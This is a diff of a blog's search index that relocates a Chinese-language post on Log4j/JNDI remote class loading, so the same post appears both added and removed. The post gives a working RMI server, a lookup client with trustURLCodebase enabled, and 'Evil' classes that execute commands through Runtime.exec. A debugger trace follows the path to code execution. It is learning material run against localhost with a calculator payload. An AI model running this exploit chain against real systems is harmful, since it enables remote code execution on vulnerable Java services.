@@ -1050,6 +1050,306 @@
       </tags>
   </entry>
   <entry>
+    <title>Log4j漏洞分析</title>
+    <url>/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
+<li>rmi服务端</li>
+<li>rmi客户端</li>
+<li>恶意类的实现</li>
+<li>idea+jdk1.8.0_441</li>
+</ul>
+<h2 id="pom-xml导入依赖"><a href="#pom-xml导入依赖" class="headerlink" title="pom.xml导入依赖"></a>pom.xml导入依赖</h2><p>正常可以使用maven</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.9.0&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></div>
+<p>但是我使用的阿里云的maven配置，所以一直远程拉取不了，这里介绍本地配置依赖的方法<br>访问<a class="link"   href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.9.0" >https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.9.0<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311110830202.png"
+                      class="" title="image-20250311110830202"
+                >
+
+<p>创建一个lib目录将依赖放进去</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311110902143.png"
+                      class="" title="image-20250311110902143"
+                > 
+
+<p>然后pom.xml里面配置</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.9.0&lt;/version&gt;</span><br><span class="line">            &lt;systemPath&gt;$&#123;project.basedir&#125;/lib/log4j-core-2.9.0.jar&lt;/systemPath&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="服务端代码实现"><a href="#服务端代码实现" class="headerlink" title="服务端代码实现"></a>服务端代码实现</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line"></span><br><span class="line">public class log4j_server &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(12345);</span><br><span class="line">        //创建一个注册表且端口为12345</span><br><span class="line">        Reference reference = new Reference(&quot;Evil&quot;, &quot;Evil&quot;,</span><br><span class="line">                &quot;http://127.0.0.1:8080/&quot;);</span><br><span class="line">        //创建Reference对象，类名为Evil，工厂类名为Evil</span><br><span class="line">        ReferenceWrapper wrapper = new ReferenceWrapper(reference);</span><br><span class="line">        //使用ReferenceWrapper包装Reference对象</span><br><span class="line">        registry.bind(&quot;remote&quot;, wrapper);</span><br><span class="line">        //将包装好的对象绑定到注册表中并设置名称为remote</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111035431.png"
+                      class="" title="image-20250311111035431"
+                >
+
+<h2 id="客户端代码实现"><a href="#客户端代码实现" class="headerlink" title="客户端代码实现"></a>客户端代码实现</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mport javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class Log4j_client &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        //System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br><span class="line">        // 这里先注释掉，这里是高版本jdk的防范机制，对url默认不信任，然后无法复现成功</span><br><span class="line">        InitialContext initialContext=new InitialContext();</span><br><span class="line">        // 创建一个JNDI InitialContext实例，用于访问JNDI服务</span><br><span class="line">        initialContext.lookup(&quot;rmi://127.0.0.1:12345/remote&quot;);</span><br><span class="line">        // 尝试连接远程主机</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111158954.png"
+                      class="" title="image-20250311111158954"
+                > 
+
+<h2 id="恶意类Evil"><a href="#恶意类Evil" class="headerlink" title="恶意类Evil"></a>恶意类Evil</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.Name;</span><br><span class="line">import javax.naming.spi.ObjectFactory;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Evil implements ObjectFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111254962.png"
+                      class="" title="image-20250311111254962"
+                > 
+
+<h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>启动服务端和客户端</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111345871.png"
+                      class="" title="image-20250311111345871"
+                > 
+
+<p><em>报错The object factory is untrusted. Set the system property ‘com.sun.jndi.rmi.object.trustURLCodebase’ to ‘true’</em> </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111457239.png"
+                      class="" title="image-20250311111457239"
+                > 
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250314171332324.png"
+                      class="" title="image-20250314171332324"
+                > 
+
+<p>我们需要进入getObjectInstance，所以我们需要进入else，就是if的条件一个都不能满足，低版本的jdk里面没有这个限制可以不用设置。高版本有这个设置。所以测试的时候不采用绕过手段我们就需要全局设置trustURLCodebase参数设置为true<strong>这里我们初步学习不采用绕过方式，所以需要设置trustURLCodebase为true</strong> </p>
+<p>所以可以先在代码层面配置一下</p>
+<p>把客户端注释删掉</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111521783.png"
+                      class="" title="image-20250311111521783"
+                > 
+
+<p> 再次运行</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111556400.png"
+                      class="" title="image-20250311111556400"
+                >
+
+<p>实现命令执行</p>
+<h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><p>端点打在客户端的<strong>initialContext.lookup(“rmi:&#x2F;&#x2F;127.0.0.1:12345&#x2F;remote”);</strong> </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112142514.png"
+                      class="" title="image-20250311112142514"
+                > 
+
+<p>跟进initialContext.lookup</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112322450.png"
+                      class="" title="image-20250311112322450"
+                >
+
+<p>这里通过提取协议，提取出来了rmi，然后判断协议是否为空，如果不为空说明是我们的url是一个ip地址  </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112621799.png"
+                      class="" title="image-20250311112621799"
+                >
+
+<p>回到上面的lookup跟进</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113252823.png"
+                      class="" title="image-20250311113252823"
+                >
+
+<p>ResolveResult var2 &#x3D; this.getRootURLContext(var1, this.myEnv);</p>
+<p>这个函数将我们的url给提取成了ip，port，以及注册表的绑定的名字remote</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113439043.png"
+                      class="" title="image-20250311113439043"
+                >
+
+<p>var3也是，知识获取了对象并且设置对象的类型为context</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113517988.png"
+                      class="" title="image-20250311113517988"
+                >
+
+<p>跟进这里的lookup，漏洞触发的地方</p>
+<p>先看var2.getRemainingName() 会返回的是什么参数</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113727742.png"
+                      class="" title="image-20250311113727742"
+                >
+
+<p>就只是返回remote，我们注册表的名字</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113816366.png"
+                      class="" title="image-20250311113816366"
+                >
+
+<p>判断我们传入的注册表的名字是否为空，我们的是remote不为空，所以往下走</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113905487.png"
+                      class="" title="image-20250311113905487"
+                > 
+
+<p>这里传入的也是remote</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113938872.png"
+                      class="" title="image-20250311113938872"
+                > 
+
+<p>这里我们可以看到有个readobject了，可以看看var4是怎么获取的也是一种思路<strong>我们这里是采用加载远程恶意类对象</strong> </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114259827.png"
+                      class="" title="image-20250311114259827"
+                > 
+
+<p>可以看到我们的var20即将被返回的值是我们的远程恶意类对象</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114349568.png"
+                      class="" title="image-20250311114349568"
+                > 
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114558379.png"
+                      class="" title="image-20250311114558379"
+                > 
+
+<p>然后将我们的恶意类对象给实例化</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114639838.png"
+                      class="" title="image-20250311114639838"
+                > 
+
+<p>跟进函数</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311114944263.png"
+                      class="" title="image-20250311114944263"
+                > 发现builder为null，所以不会进入这个if
+
+<p>将恶意类名称赋值给了ref</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311115057408.png"
+                      class="" title="image-20250311115057408"
+                > 
+
+<p>获取对象的实例</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311120004969.png"
+                      class="" title="image-20250311120004969"
+                >
+
+<p>获取实例的时候会调用我们写的无参构造方法，所以就执行了我们的恶意代码。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311120021055.png"
+                      class="" title="image-20250311120021055"
+                > 
+
+<h2 id="恶意类的无参构造初始化"><a href="#恶意类的无参构造初始化" class="headerlink" title="恶意类的无参构造初始化"></a>恶意类的无参构造初始化</h2><p>根据上面链子发现factory.getObjectInstance函数会调用我们的类的无参实例化方法</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.Name;</span><br><span class="line">import javax.naming.spi.ObjectFactory;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Evil implements ObjectFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="类的静态方法"><a href="#类的静态方法" class="headerlink" title="类的静态方法"></a>类的静态方法</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil_static &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311125258505.png"
+                      class="" title="image-20250311125258505"
+                >
+
+<p>成功造成命令执行</p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>这里的漏洞触发点有一些不同</p>
+<p>javax&#x2F;naming&#x2F;spi&#x2F;NamingManager.java</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130215787.png"
+                      class="" title="image-20250311130215787"
+                > 
+
+<p>这里有个if判断，codebase为null所以不会进去</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130605217.png"
+                      class="" title="image-20250311130605217"
+                > 
+
+<p>最后会走到对我们恶意类的实例化</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130335797.png"
+                      class="" title="image-20250311130335797"
+                >
+
+<p>然后实例化调用了静态方法造成RCE</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311130639541.png"
+                      class="" title="image-20250311130639541"
+                > 
+
+]]></content>
+      <categories>
+        <category>漏洞原理分析</category>
+      </categories>
+      <tags>
+        <tag>JNDI</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Godzilla二次开发</title>
     <url>/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h2 id="项目搭建"><a href="#项目搭建" class="headerlink" title="项目搭建"></a>项目搭建</h2><p><em>参考链接</em><a class="link"   href="https://blog.csdn.net/ggqiuhui/article/details/144934675?spm=1001.2014.3001.5502" >https://blog.csdn.net/ggqiuhui/article/details/144934675?spm=1001.2014.3001.5502<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
@@ -1657,306 +1957,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Log4j漏洞分析</title>
-    <url>/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
-<li>rmi服务端</li>
-<li>rmi客户端</li>
-<li>恶意类的实现</li>
-<li>idea+jdk1.8.0_441</li>
-</ul>
-<h2 id="pom-xml导入依赖"><a href="#pom-xml导入依赖" class="headerlink" title="pom.xml导入依赖"></a>pom.xml导入依赖</h2><p>正常可以使用maven</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.9.0&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></div>
-<p>但是我使用的阿里云的maven配置，所以一直远程拉取不了，这里介绍本地配置依赖的方法<br>访问<a class="link"   href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.9.0" >https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.9.0<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311110830202.png"
-                      class="" title="image-20250311110830202"
-                >
-
-<p>创建一个lib目录将依赖放进去</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311110902143.png"
-                      class="" title="image-20250311110902143"
-                > 
-
-<p>然后pom.xml里面配置</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.9.0&lt;/version&gt;</span><br><span class="line">            &lt;systemPath&gt;$&#123;project.basedir&#125;/lib/log4j-core-2.9.0.jar&lt;/systemPath&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="服务端代码实现"><a href="#服务端代码实现" class="headerlink" title="服务端代码实现"></a>服务端代码实现</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line"></span><br><span class="line">public class log4j_server &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(12345);</span><br><span class="line">        //创建一个注册表且端口为12345</span><br><span class="line">        Reference reference = new Reference(&quot;Evil&quot;, &quot;Evil&quot;,</span><br><span class="line">                &quot;http://127.0.0.1:8080/&quot;);</span><br><span class="line">        //创建Reference对象，类名为Evil，工厂类名为Evil</span><br><span class="line">        ReferenceWrapper wrapper = new ReferenceWrapper(reference);</span><br><span class="line">        //使用ReferenceWrapper包装Reference对象</span><br><span class="line">        registry.bind(&quot;remote&quot;, wrapper);</span><br><span class="line">        //将包装好的对象绑定到注册表中并设置名称为remote</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111035431.png"
-                      class="" title="image-20250311111035431"
-                >
-
-<h2 id="客户端代码实现"><a href="#客户端代码实现" class="headerlink" title="客户端代码实现"></a>客户端代码实现</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mport javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class Log4j_client &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        //System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br><span class="line">        // 这里先注释掉，这里是高版本jdk的防范机制，对url默认不信任，然后无法复现成功</span><br><span class="line">        InitialContext initialContext=new InitialContext();</span><br><span class="line">        // 创建一个JNDI InitialContext实例，用于访问JNDI服务</span><br><span class="line">        initialContext.lookup(&quot;rmi://127.0.0.1:12345/remote&quot;);</span><br><span class="line">        // 尝试连接远程主机</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111158954.png"
-                      class="" title="image-20250311111158954"
-                > 
-
-<h2 id="恶意类Evil"><a href="#恶意类Evil" class="headerlink" title="恶意类Evil"></a>恶意类Evil</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.Name;</span><br><span class="line">import javax.naming.spi.ObjectFactory;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Evil implements ObjectFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111254962.png"
-                      class="" title="image-20250311111254962"
-                > 
-
-<h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>启动服务端和客户端</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111345871.png"
-                      class="" title="image-20250311111345871"
-                > 
-
-<p><em>报错The object factory is untrusted. Set the system property ‘com.sun.jndi.rmi.object.trustURLCodebase’ to ‘true’</em> </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111457239.png"
-                      class="" title="image-20250311111457239"
-                > 
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250314171332324.png"
-                      class="" title="image-20250314171332324"
-                > 
-
-<p>我们需要进入getObjectInstance，所以我们需要进入else，就是if的条件一个都不能满足，低版本的jdk里面没有这个限制可以不用设置。高版本有这个设置。所以测试的时候不采用绕过手段我们就需要全局设置trustURLCodebase参数设置为true<strong>这里我们初步学习不采用绕过方式，所以需要设置trustURLCodebase为true</strong> </p>
-<p>所以可以先在代码层面配置一下</p>
-<p>把客户端注释删掉</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111521783.png"
-                      class="" title="image-20250311111521783"
-                > 
-
-<p> 再次运行</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111556400.png"
-                      class="" title="image-20250311111556400"
-                >
-
-<p>实现命令执行</p>
-<h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><p>端点打在客户端的<strong>initialContext.lookup(“rmi:&#x2F;&#x2F;127.0.0.1:12345&#x2F;remote”);</strong> </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112142514.png"
-                      class="" title="image-20250311112142514"
-                > 
-
-<p>跟进initialContext.lookup</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112322450.png"
-                      class="" title="image-20250311112322450"
-                >
-
-<p>这里通过提取协议，提取出来了rmi，然后判断协议是否为空，如果不为空说明是我们的url是一个ip地址  </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112621799.png"
-                      class="" title="image-20250311112621799"
-                >
-
-<p>回到上面的lookup跟进</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113252823.png"
-                      class="" title="image-20250311113252823"
-                >
-
-<p>ResolveResult var2 &#x3D; this.getRootURLContext(var1, this.myEnv);</p>
-<p>这个函数将我们的url给提取成了ip，port，以及注册表的绑定的名字remote</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113439043.png"
-                      class="" title="image-20250311113439043"
-                >
-
-<p>var3也是，知识获取了对象并且设置对象的类型为context</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113517988.png"
-                      class="" title="image-20250311113517988"
-                >
-
-<p>跟进这里的lookup，漏洞触发的地方</p>
-<p>先看var2.getRemainingName() 会返回的是什么参数</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113727742.png"
-                      class="" title="image-20250311113727742"
-                >
-
-<p>就只是返回remote，我们注册表的名字</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113816366.png"
-                      class="" title="image-20250311113816366"
-                >
-
-<p>判断我们传入的注册表的名字是否为空，我们的是remote不为空，所以往下走</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113905487.png"
-                      class="" title="image-20250311113905487"
-                > 
-
-<p>这里传入的也是remote</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113938872.png"
-                      class="" title="image-20250311113938872"
-                > 
-
